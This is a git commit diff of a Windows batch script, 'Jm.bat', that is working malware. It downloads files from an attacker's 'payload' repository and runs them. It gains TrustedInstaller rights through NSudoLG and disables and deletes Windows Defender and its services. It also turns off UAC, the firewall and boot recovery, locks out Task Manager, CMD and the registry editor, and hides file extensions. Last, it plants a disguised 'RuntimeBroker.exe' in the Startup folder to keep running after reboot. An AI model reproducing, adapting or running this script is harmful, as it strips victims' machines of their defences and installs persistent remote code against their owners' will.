0b03c5cf89f4aa7c352f434154a8ab88c72c8986
Jm <88747447+anonymous-osif@users.noreply.github.com>
2022-06-12 02:18:28 +0200

    Add files via upload

--- Jm.bat
+++ Jm.bat
@@ -1,37 +1,46 @@
 cd "C:\Users\%USERNAME%\AppData\Local"
-mkdir Anon && cd Anon
-Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/fun.jpg' -OutFile fun.jpg" && powershell start "fun.jpg"
-Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/NSudoLG.exe' -OutFile NSudoLG.exe"
-Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile ss.jpg"
-Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/db.bat' -OutFile db.bat"
+mkdir Anon
+attrib +h Anon /s /d
+::--------------------------------------
+Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/fun.jpg' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
+Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\ss.jpg"
+Powershell start "C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
 ::--------------------------------------
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%USERNAME%\AppData\Local\Anon\ss.jpg /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-@start /b "Revision - TrustedInstaller" "NSudoLG.exe" -U:T -P:E "db.bat"
+::--------------------------------------
 set pop=%systemroot%
-Powershell -Command "sleep 2"
-NSudoLG -U:T -U:T icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0x0 /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /f /d 0 > NUl
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /f /d 0
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/NSudoLG.exe' -OutFile %TEMP%\NSudoLG.exe"
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\MsSecFlt" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmAgent" /v "Start" /t REG_DWORD /d "4" /f >nul
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f >nul
 ::--------------------------------------
-NSudoLG -U:T -ShowWindowMode:Hide sc stop windefend
-NSudoLG -U:T -ShowWindowMode:Hide sc delete windefend
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /f /d "0" >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d "0" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "1" /f >nul
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul
+reg add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v "Restrict_Run" /t REG_DWORD /d "1" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f >nul
 ::--------------------------------------
-powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
-::--------------------------------------
-NSudoLG -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
-NSudoLG -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide sc stop windefend
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide sc delete windefend
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
+%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
 ::--------------------------------------
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
 powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
@@ -41,12 +50,7 @@ powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 ::--------------------------------------
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/RuntimeBroker.exe' -OutFile RuntimeBroker.exe"
-start RuntimeBroker.exe
-::--------------------------------------
-Powershell -Command "sleep 5"
-taskkill /f /IM explorer.exe
-start explorer.exe
-exit
-::--------------------------------------
+cd %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/RuntimeBroker.exe' -OutFile RuntimeBroker.exe" && start RuntimeBroker.exe"
+Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss/RuntimeBroker.exe' -OutFile %TEMP%\RuntimeBroker.exe" && Powershell start "%TEMP%\RuntimeBroker.exe"
+rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Anon\" && del "%TEMP%\NSudoLG.exe" && taskkill /f /IM explorer.exe && Powershell start explorer.exe && exit
